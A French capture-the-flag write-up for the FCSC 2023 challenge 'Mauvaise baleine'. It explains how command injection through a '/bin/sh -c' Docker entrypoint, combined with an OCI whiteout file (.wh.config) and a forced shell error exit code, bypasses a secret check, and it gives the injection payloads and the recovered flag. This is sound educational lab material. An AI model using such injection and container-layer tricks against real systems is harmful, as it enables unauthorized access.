# Mauvaise baleine (misc, ★★★)
## Présentation
Mauvaise baleine est une épreuve de *misc* au FCSC 2023.

Une archive est donnée. Elle contient deux conteneurs : `server` et
`base-challenge-image`. Chaque conteneur contient un programme en Go dont le
code source est donné.

Le nom de l'épreuve fait référence à Docker.

### base-challenge-image
Le premier conteneur contient un binaire suid, `/change_flag`, et deux fichiers.

Le premier fichier est le flag, situé en `/base-challenge/flag`. L'utilisateur
ne peut pas le lire. Seul `/change_flag` peut le lire et le modifier.

Le deuxième fichier est un secret situé en `/base-challenge/config/secret`.

Le binaire prend deux arguments en paramètre : un secret et un nouveau flag. Le
binaire ouvre `/base-challenge/config/secret`, compare le secret avec le contenu
du fichier. Si le secret est correct, le binaire remplace le flag par le flag
passé en argument et affiche l'ancienne valeur.

Par défaut, le secret est `V3ryS3cr3t` (mais ce secret est changé sur l'instance
à distance).

```
/ $ /change_flag foo bar
invalid secret

/ $ /change_flag V3ryS3cr3t test
FCSC{ThisIsTheFl4g}

/ $ /change_flag V3ryS3cr3t loremipsum
test
```

On remarque que les permissions du dossier `/base-challenge` sont inhabituelles.
En particulier, on remarque qu'il est possible de supprimer des fichiers et d'en
recréer.

```
/ $ stat /base-challenge/
  File: /base-challenge/
  Size: 4096      	Blocks: 16         IO Block: 4096   directory
Device: 3bh/59d	Inode: 10109496    Links: 1
Access: (0777/drwxrwxrwx)  Uid: (    0/    root)   Gid: (    0/    root)
[...]


/base-challenge $ mv config old
/base-challenge $ mkdir config
/base-challenge $ printf test > config/secret
/base-challenge $ /change_flag test aaa
FCSC{ThisIsTheFl4g}
```

Le binaire renvoie 0 si le flag est modifié et 42 sinon.

### server
Le second conteneur contient un autre binaire. Il a accès à la socket unix de
Docker (`/var/run/docker.sock`) qui lui permet d'envoyer des requêtes au démon
Docker.

Le binaire crée un nouveau tag à l'image `base-challenge-image`. Il présente
ensuite un prompt à l'utilisateur qui lui permet de changer le flag.

Lorsque l'utilisateur change le flag, le binaire démarre le conteneur en
exécutant `/change_flag $arg1 $arg2`. Si le conteneur ne renvoie *pas* 42 (c'est
à dire que le flag a été changé), les modifications sont appliquées au tag,
sinon elles sont supprimées.


## Vulnérabilité
La vulnérabilité est assez simple : le conteneur `base-challenge-image` contient
un *entrypoint* qui est :

```
ENTRYPOINT [ "/bin/sh", "-c" ]
```

Cette configuration est vulnérable à une injection de commande :
```
Entrer "help" pour le message d'aide
> change_flag foo $(sleep${IFS}10)
Une erreur interne est survenue.
```

## Exploitation
Cette injection de commande permet d'exécuter des commandes *avant* l'exécution
de `change_flag`.

Il est possible d'utiliser le fait que `/base-challenge` ait des permissions
trop large pour supprimer le dossier config. Cette méthode fonctionne en local.

```
% docker-compose exec server /fcsc2023-mauvaise-baleine
[log] new session f55dd21435f5e91e15584fabd7b19044
Entrer "help" pour le message d'aide
> change_flag  $(cd${IFS}/b*;mv${IFS}config${IFS}old)
[log] change flag with secret ""; new flag: "$(cd${IFS}/b*;mv${IFS}config${IFS}old)"
flag: FCSC{ThisIsTheFl4g}
```

... mais pas à distance !

```
> change_flag  $(cd${IFS}/b*;mv${IFS}config${IFS}old)
invalid secret
```

Il existe un autre moyen de supprimer le dossier `config` : c'est de créer un
fichier `.wh.config` et d'enregistrer les modifications dans le conteneur en
créant une nouvelle couche (*layer*).

Ce comportement est définit dans la
[spécification OpenContainers](https://github.com/opencontainers/image-spec/blob/main/layer.md#whiteouts)

Une nouvelle couche est crée par le conteneur `server` lorsque la valeur
retournée par le conteneur `base-challenge-image` est différent de 42. Cette
condition est remplie lorsque le bon secret est passé au programme.

Il est cependant possible de retourner une valeur que 42 grâce à l'injection de
commande : en faisant une erreur d'exécution dans `sh`.

```
% sh -c 'echo $((1/0))'; echo $?
sh: line 1: 1/0: division by 0 (error token is "0")
127
```

Comme il y a deux arguments, on peut combiner ces deux techniques pour créer un
fichier vide `.wh.config` qui va avoir pour effet de supprimer le dossier
`config`. Une fois le dossier supprimé, le binaire accepte un secret vide.

```
Entrer "help" pour le message d'aide
> change_flag $(>/base-challenge/.wh.config) $((1/0))
flag: /bin/sh: divide by zero
> change_flag  flag
flag: FCSC{e71b709df406f96fc0af5422b121a169801385b5659fa3fd4bd1073b2308fc3c}>
```


**Flag**: `FCSC{e71b709df406f96fc0af5422b121a169801385b5659fa3fd4bd1073b2308fc3c}`
